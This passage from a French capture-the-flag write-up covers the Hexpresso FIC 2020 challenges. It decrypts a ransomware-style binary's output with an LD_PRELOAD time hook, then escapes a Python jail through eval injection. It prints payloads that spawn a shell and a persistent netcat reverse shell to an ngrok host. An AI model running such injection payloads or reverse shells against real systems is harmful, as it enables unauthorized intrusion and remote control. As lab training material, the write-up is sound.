class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ wget https://ctf.hexpresso.fr/5c09555ef0576e6cee46a9ee7a841c8b.zip                          
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ unzip 5c09555ef0576e6cee46a9ee7a841c8b.zip
+</span></span><span class=line><span class=cl>Archive:  5c09555ef0576e6cee46a9ee7a841c8b.zip
+</span></span><span class=line><span class=cl> extracting: flag.txt.crypt          
+</span></span><span class=line><span class=cl>  inflating: wannafic                
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ file *
+</span></span><span class=line><span class=cl>5c09555ef0576e6cee46a9ee7a841c8b.zip: Zip archive data, at least v1.0 to extract
+</span></span><span class=line><span class=cl>flag.txt.crypt:                       data
+</span></span><span class=line><span class=cl>wannafic:                             ELF 64-bit LSB pie executable, x86-64, version <span class=m>1</span> <span class=o>(</span>SYSV<span class=o>)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span class=o>[</span>sha1<span class=o>]=</span>97354f92f87502594330507adef22eca2765dd76, <span class=k>for</span> GNU/Linux 3.2.0, stripped
+</span></span></code></pre></td></tr></table></div></div><h3 id=iv2-analyse-du-binaire>IV.2. Analyse du binaire</h3><p>En plaçant le binaire &ldquo;wannafic&rdquo; dans Ghidra, on remarque très rapidement qu&rsquo;il y a que très peu de code dans le main:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_414376f09f26890c020ef6a94b4697ca.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_414376f09f26890c020ef6a94b4697ca.png, /lib/images/writeups/2020_hexpresso_fic/upload_414376f09f26890c020ef6a94b4697ca.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_414376f09f26890c020ef6a94b4697ca.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_414376f09f26890c020ef6a94b4697ca.png title=/lib/images/writeups/2020_hexpresso_fic/upload_414376f09f26890c020ef6a94b4697ca.png></p><p>Tout le traitement se fait dans la fonction &ldquo;payload_fn&rdquo;:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_db5d79d6ccda4b95100ca24c7e16eb80.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_db5d79d6ccda4b95100ca24c7e16eb80.png, /lib/images/writeups/2020_hexpresso_fic/upload_db5d79d6ccda4b95100ca24c7e16eb80.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_db5d79d6ccda4b95100ca24c7e16eb80.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_db5d79d6ccda4b95100ca24c7e16eb80.png title=/lib/images/writeups/2020_hexpresso_fic/upload_db5d79d6ccda4b95100ca24c7e16eb80.png></p><p>Dans la fonction &ldquo;payload_fn&rdquo;, les deux lignes encadrées sont importantes:</p><ol><li>Orange: Récupération du timestamp actuel au format epoch ;</li><li>Rouge: Une fonction prenant comme paramètre le contenu du fichier et le timestamp.</li></ol><p>Dans la fonction &ldquo;crypt_fn&rdquo;, on voit le srand se basant sur le timestamp format epoch (encadré rouge), mais aussi l&rsquo;algo permettant de chiffrer le fichier en entrée.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_d09167a51b498665153198e79b644871.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_d09167a51b498665153198e79b644871.png, /lib/images/writeups/2020_hexpresso_fic/upload_d09167a51b498665153198e79b644871.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_d09167a51b498665153198e79b644871.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_d09167a51b498665153198e79b644871.png title=/lib/images/writeups/2020_hexpresso_fic/upload_d09167a51b498665153198e79b644871.png></p><p>La boucle va générer un keystream se basant sur le timestamp et va xorer caractère par caractère:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>input_file[rand_output % size_input_file] ^ (_char_n ^ rand_output)
+</span></span></code></pre></td></tr></table></div></div><p>L&rsquo;opération étant réversible, il est possible de déchiffrer le fichier en prenant son timestamp comme base pour générer le keystream.</p><h3 id=iv3-déchiffrement-du-fichier>IV.3. Déchiffrement du fichier</h3><p>Pour tenter l&rsquo;hypothèse évoquée ci-dessus, il faut récupérer le timestamp de &ldquo;flag.txt.crypt&rdquo;:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ stat -c %Y flag.txt.crypt        
+</span></span><span class=line><span class=cl><span class=m>1576154262</span>
+</span></span></code></pre></td></tr></table></div></div><p>L&rsquo;argument &ldquo;%Y&rdquo; donne le timestamp de la dernière modification du fichier depuis epoch.</p><p>Pour hooker la fonction time du binaire et forcer le retour à ce timestamp précis, il existe la technique du &ldquo;LD_PRELOAD&rdquo;. Le but est de créer une fonction du même nom, time en l&rsquo;occurence, pour forcer une action précise.</p><p>Dans notre cas, l&rsquo;action bien précise est de forcer le retour de la fonction time du binaire avec le timestamp du fichier chiffré.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;time.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=n>time_t</span> <span class=nf>time</span><span class=p>(</span><span class=n>time_t</span> <span class=o>*</span><span class=n>t</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=mi>1576154262</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Avant le lancement du binaire, on renomme le fichier chiffré en flag.txt:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_5bae307c265a085bd0a9b4b6db594ad2.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_5bae307c265a085bd0a9b4b6db594ad2.png, /lib/images/writeups/2020_hexpresso_fic/upload_5bae307c265a085bd0a9b4b6db594ad2.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_5bae307c265a085bd0a9b4b6db594ad2.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_5bae307c265a085bd0a9b4b6db594ad2.png title=/lib/images/writeups/2020_hexpresso_fic/upload_5bae307c265a085bd0a9b4b6db594ad2.png></p><p>L&rsquo;output ne ressemble pas à grand chose, mais ce qui est affiché est bien plus petit que le fichier chiffré.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_6161435a77ef10618d2396a8cf40e272.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_6161435a77ef10618d2396a8cf40e272.png, /lib/images/writeups/2020_hexpresso_fic/upload_6161435a77ef10618d2396a8cf40e272.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_6161435a77ef10618d2396a8cf40e272.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_6161435a77ef10618d2396a8cf40e272.png title=/lib/images/writeups/2020_hexpresso_fic/upload_6161435a77ef10618d2396a8cf40e272.png></p><p>Le caractère <code>\xff</code> a l&rsquo;air de péter l&rsquo;output. Les caractères <code>\x0a</code>, <code>\x0d</code> et <code>\x00</code> risquent de péter l&rsquo;output également. Une technique &ldquo;c&rsquo;est moche mais ça marche&rdquo;, serait de patcher le fichier chiffrer en remplaçant ces badchars par un caractère imprimable, comme <code>A</code> par exemple. Le déchiffrement à ces caractères ne fonctionneraient pas, mais avec un peu de chance on pourra quand même récupérer le hash pour passer à la suite.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=n>enc_dat</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;flag.txt&#39;</span><span class=p>,</span><span class=s1>&#39;rb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=n>enc_dat</span> <span class=o>=</span> <span class=n>enc_dat</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\xff</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;A&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x0a</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;A&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x0d</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;A&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;A&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;flag.txt&#39;</span><span class=p>,</span><span class=s1>&#39;w&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>enc_dat</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=iv4-flag>IV.4. Flag</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ gcc time.c -o <span class=nb>time</span> -shared -fPIC<span class=p>;</span> <span class=nv>LD_PRELOAD</span><span class=o>=</span><span class=s2>&#34;</span><span class=si>${</span><span class=nv>PWD</span><span class=si>}</span><span class=s2>/time&#34;</span> ./wannafic flag.txt<span class=p>;</span> cat flag.txt.crypt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> ██░ ██ ▓█████ ▒█   █<span class=se>\▒</span> ██▓█<span class=se>\█</span>   ██▀███  ▓█████   █████   ██████  ▒█████      █     █░ ▄▄▄        ██████     █░ ██ ▓█████  ██▀██  ▓█████ 
+</span></span><span class=line><span class=cl>██░ ██▒▓█   ▀ ▒▒ █ █ ▒░▓██░  ██▒▓██ ג ██▒▓█   ▀ ▒██    ▒ ▒██    ▒ ▒██▒  ██▒   ▓░ █ ░█░▒████▄    ▒██    ▒    ▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒▓█   ▀ 
+</span></span><span class=line><span class=cl>▒█▀▀██░▒███   ░░  █  ░▓██░ ██▓▒▓██ ░▄█ ▒▒███   ░ ▓██▄   ░ ▓██▄   ▒██░  ██▒   ▒█░ █ ░█ ▒██  ▀█▄  ░ ▓██▄      ▒██▀▀██░▒███   ██ ▄█ ▒▒███   
+</span></span><span class=line><span class=cl>░▓█ ░██ ▒▓█  ▄  / █ █ ▒ ▒██▄█▓▒ ▒▒██▀▀█▄  ▒▓█ ▄   ▒   ██  ▒   ██▒▒██   ██░   ░█░ █ ░█ ░██▄▄▄▄██l  ▒   ██▒   ░▓█ ░██ ▒▓█  ▄ ██▀▀█▄  ▒▓█  ▄ 
+</span></span><span class=line><span class=cl>░▓█▒░██▓░▒███▒▒██▒ ▒██▒▒██▒ ░  ░░██▓ ▒██▒░▒████▒▒██████▒▒▒██████▒▒░ ████▓▒░   ░░██▒██  ▓█   ▓█▒▒████▒▒   ░▓█▒░██▓░▒███▒░██▓ ▒██▒░▒███<span class=se>\▒</span>
+</span></span><span class=line><span class=cl> ▒ ░░▒░▒░░ ▒░ ░▒▒ ░ ░▓ ░▒▓▒░ ░  ░░ ▒▓ ░▒▓░░░ ▒<span class=o>(</span> ░▒ ▒▓▒ ▒ ░▒ ▒▓▒  ░░ ▒░▒░▒░    ░▓░▒ ▒   ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░    ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░░ ▒░ ░
+</span></span><span class=line><span class=cl> ▒ ░▒░ ░ ░ ░  ░<span class=se>\░</span>   ░▒ ░░▒ ░       ░▒ ░ ▒░ ░ ░  ░░ ▒  ░ ░░ ░▒  ░ ░  ░ ▒ ▒░      ▒ ░ ░      ▒ ░░░▒  ░ ░    ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░ ░ ░  ░
+</span></span><span class=line><span class=cl> ░  ░░ ░   ░    ░    ░  ░        ░░   ░    ░   ░  ░  ░  ░  ░  ░  ░ ░ ░ ▒       ░       ░   ▒   ░  ░  ░        ░░ ░   ░     ░░   ░    ░   
+</span></span><span class=line><span class=cl> ░  ░  ░   ░  ░ ░    ░             ░        ░  ░      ░        ░      ░ ░         ░          ░  ░      ░      ░  ░  ░   ░  ░   ░        ░  ░
+</span></span><span class=line><span class=cl>                                      k                                                                        k                           
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Well <span class=k>done</span> buddy !!!!
+</span></span><span class=line><span class=cl>Next step : https<span class=o>{</span>//ctf.hexpresso.fr/6bd1d24ab3aa08784f868a533bcdc215
+</span></span></code></pre></td></tr></table></div></div><blockquote><p><a href=https://ctf.hexpresso.fr/6bd1d24ab3aa08784f868a533bcdc215 target=_blank rel="noopener noreffer">https://ctf.hexpresso.fr/6bd1d24ab3aa08784f868a533bcdc215</a></p></blockquote><h2 id=v-step-5---pyjail-4-fun>V. Step 5 - PYJAIL 4 FUN</h2><table><thead><tr><th>Event</th><th>Challenge</th><th>Category</th><th>Solves</th></tr></thead><tbody><tr><td>CatureTheFic</td><td>Step 5</td><td>PyJail</td><td>234</td></tr></tbody></table><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_57c389cb189abc052097f2ec296d40a5.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_57c389cb189abc052097f2ec296d40a5.png, /lib/images/writeups/2020_hexpresso_fic/upload_57c389cb189abc052097f2ec296d40a5.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_57c389cb189abc052097f2ec296d40a5.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_57c389cb189abc052097f2ec296d40a5.png title=/lib/images/writeups/2020_hexpresso_fic/upload_57c389cb189abc052097f2ec296d40a5.png></p><h3 id=v1-etat-de-lart>V.1. Etat de l&rsquo;art</h3><p>On commence cette épreuve avec une archive contenant des certificats ssl et une commande socat:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_1d9c480de6df215db2667838dbde40cd.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_1d9c480de6df215db2667838dbde40cd.png, /lib/images/writeups/2020_hexpresso_fic/upload_1d9c480de6df215db2667838dbde40cd.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_1d9c480de6df215db2667838dbde40cd.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_1d9c480de6df215db2667838dbde40cd.png title=/lib/images/writeups/2020_hexpresso_fic/upload_1d9c480de6df215db2667838dbde40cd.png></p><p>En se connectant, la première chose que je teste est d&rsquo;afficher une chaine de caractère:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_5651f4868f9a065f83d88a1b658fc0e0.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_5651f4868f9a065f83d88a1b658fc0e0.png, /lib/images/writeups/2020_hexpresso_fic/upload_5651f4868f9a065f83d88a1b658fc0e0.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_5651f4868f9a065f83d88a1b658fc0e0.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_5651f4868f9a065f83d88a1b658fc0e0.png title=/lib/images/writeups/2020_hexpresso_fic/upload_5651f4868f9a065f83d88a1b658fc0e0.png></p><p>Visiblement, il n&rsquo;aime pas les simples quotes. Au final, avec la syntaxe suivante il est possible d&rsquo;afficher la chaine de caractère:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_126ae445cf09947c5f3774822a604747.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_126ae445cf09947c5f3774822a604747.png, /lib/images/writeups/2020_hexpresso_fic/upload_126ae445cf09947c5f3774822a604747.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_126ae445cf09947c5f3774822a604747.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_126ae445cf09947c5f3774822a604747.png title=/lib/images/writeups/2020_hexpresso_fic/upload_126ae445cf09947c5f3774822a604747.png></p><blockquote><p><code>'+print("hello")+'</code></p></blockquote><h3 id=v2-récupération-du-code>V.2. Récupération du code</h3><p>Maintenant qu&rsquo;on peut executer du python, il est possible de pop un shell grâce à la librairie <code>pty</code>.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_e7f75504223a2e36df814f046c31a38a.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_e7f75504223a2e36df814f046c31a38a.png, /lib/images/writeups/2020_hexpresso_fic/upload_e7f75504223a2e36df814f046c31a38a.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_e7f75504223a2e36df814f046c31a38a.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_e7f75504223a2e36df814f046c31a38a.png title=/lib/images/writeups/2020_hexpresso_fic/upload_e7f75504223a2e36df814f046c31a38a.png></p><blockquote><p><code>'+__import__("pty").spawn("sh")+'</code></p></blockquote><p>Cet accès shell permet de récupérer le code du challenge, situé dans &ldquo;main.py&rdquo;:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>SUCCESS</span> <span class=o>=</span> <span class=s2>&#34;Good flag !&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>FAIL</span> <span class=o>=</span> <span class=s2>&#34;Bad flag !&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_flag</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>environ</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;FLAG&#34;</span><span class=p>,</span> <span class=s2>&#34;FLAG</span><span class=si>{LOCAL_FLAG}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>environ</span><span class=o>.</span><span class=n>update</span><span class=p>({</span><span class=s2>&#34;FLAG&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>})</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>flag</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_input</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>eval</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;&#34;&#34;&#39;</span><span class=si>{</span><span class=nb>input</span><span class=p>(</span><span class=s2>&#34;&gt;&#34;</span><span class=p>)</span><span class=si>}</span><span class=s2>&#39;&#34;&#34;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>=</span> <span class=n>get_flag</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>flag</span> <span class=o>==</span> <span class=n>get_input</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>SUCCESS</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>FAIL</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>Le shell timeout au bout de quelque seconde en permanence, ce qui est très embêtant pour faire son énumération. Grâce à la commande <code>nohup</code> sous Linux, il est possible de créer des process indépendamment de l&rsquo;utilisateur. C&rsquo;est à dire que si je fais un reverse shell, il sera accessible même si je timeout.</p><p>Avec <code>ngrok</code>, pas besoin de VPS pour récupérer un shell. L&rsquo;article de TheLaluka en parle bien: <a href=https://thinkloveshare.com/en/hacking/ngrok_your_dockersploit/ target=_blank rel="noopener noreffer">https://thinkloveshare.com/en/hacking/ngrok_your_dockersploit/</a></p><p>Le but de <code>ngrok</code> est d&rsquo;ouvrir une socket TCP sur internet bindé à un ncat en écoute.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_41177383c501c919d6e6eab4078320f5.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_41177383c501c919d6e6eab4078320f5.png, /lib/images/writeups/2020_hexpresso_fic/upload_41177383c501c919d6e6eab4078320f5.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_41177383c501c919d6e6eab4078320f5.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_41177383c501c919d6e6eab4078320f5.png title=/lib/images/writeups/2020_hexpresso_fic/upload_41177383c501c919d6e6eab4078320f5.png></p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_fe3eecc09702ffd2afc182484217a8aa.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_fe3eecc09702ffd2afc182484217a8aa.png, /lib/images/writeups/2020_hexpresso_fic/upload_fe3eecc09702ffd2afc182484217a8aa.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_fe3eecc09702ffd2afc182484217a8aa.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_fe3eecc09702ffd2afc182484217a8aa.png title=/lib/images/writeups/2020_hexpresso_fic/upload_fe3eecc09702ffd2afc182484217a8aa.png></p><blockquote><p><code>'+__import__("pty").spawn("sh")+'</code>
+<code>nohup nc 0.tcp.ngrok.io 16368 -e /bin/sh >/dev/null 2>&1 &</code></p></blockquote><h3 id=v3-analyse-de-la-pyjail>V.3. Analyse de la pyjail</h3><p>La fonction <code>get_flag()</code> de la pyjail est vraiment inréressante:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_flag</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>environ</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;FLAG&#34;</span><span class=p>,</span> <span class=s2>&#34;FLAG</span><span class=si>{LOCAL_FLAG}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>environ</span><span class=o>.</span><span class=n>update</span><span class=p>({</span><span class=s2>&#34;FLAG&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>})</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>flag</span>
+</span></span></code></pre></td></tr></table></div></div><ol><li><code>flag = os.environ.get("FLAG", "FLAG{LOCAL_FLAG}")</code> : Récupère la valeur de la variable d&rsquo;environnement &ldquo;FLAG&rdquo; et la met dans la variable &ldquo;flag&rdquo;;</li><li><code>os.environ.update({"FLAG": ""})</code> : Va clear la variable d&rsquo;environnement &ldquo;FLAG&rdquo;;</li><li><code>return flag</code> : Retourne la valeur de la fonction flag.</li></ol><p>Donc ça veut dire que le flag présent dans la variable &ldquo;flag&rdquo; est toujours en mémoire lors de la première exécution.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>=</span> <span class=n>get_flag</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>flag</span> <span class=o>==</span> <span class=n>get_input</span><span class=p>():</span>
+</span></span></code></pre></td></tr></table></div></div><p>Quand le script attend une input, le flag est présent en mémoire.</p><h3 id=v4-debug-all-the-things>V.4. Debug all the things</h3><p>En cherchant différents modules, on tombe sur le module <code>pdb</code> de python qui est le debugger python. Grâce à l&rsquo;injection de python dans le programme, il est possible de debug directement le script:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_89f95b5a0b99c3eb8235e0f69aa71a5b.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_89f95b5a0b99c3eb8235e0f69aa71a5b.png, /lib/images/writeups/2020_hexpresso_fic/upload_89f95b5a0b99c3eb8235e0f69aa71a5b.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_89f95b5a0b99c3eb8235e0f69aa71a5b.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_89f95b5a0b99c3eb8235e0f69aa71a5b.png title=/lib/images/writeups/2020_hexpresso_fic/upload_89f95b5a0b99c3eb8235e0f69aa71a5b.png></p><blockquote><p><code>'+print(__import__("pdb").set_trace())+'</code></p></blockquote><ul><li><code>n</code> : Instruction suivante;</li><li><code>l</code> : Affiche les sources dans la contexte actuel;</li><li><code>p var</code> : Affiche le contenu de la variable 